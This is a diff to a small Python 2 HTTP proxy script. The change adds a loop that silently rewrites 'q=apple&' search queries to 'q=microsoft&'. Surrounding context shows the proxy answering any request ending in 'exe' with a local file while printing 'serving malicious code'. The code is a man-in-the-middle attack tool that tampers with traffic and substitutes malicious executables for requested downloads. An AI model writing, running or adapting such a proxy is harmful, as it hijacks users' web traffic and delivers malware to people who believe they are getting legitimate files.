@@ -1,7 +1,6 @@
 import SocketServer
 import SimpleHTTPServer
 import urllib, urllib2
-import re
 import os
 
 PORT = 8080
@@ -11,6 +10,9 @@ class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
 	def send_error(self, code, message):
 		return False
 	def do_GET(self):
+		while "q=apple&" in self.path:
+			self.path = self.path[:self.path.find("q=apple&")] + "q=microsoft&" + self.path[self.path.find("q=apple&")+8:]
+			print self.path
 		if self.path[len(self.path)-3:] == "exe":
 			malfile = open("test.txt", "r")
 			print "serving malicious code"
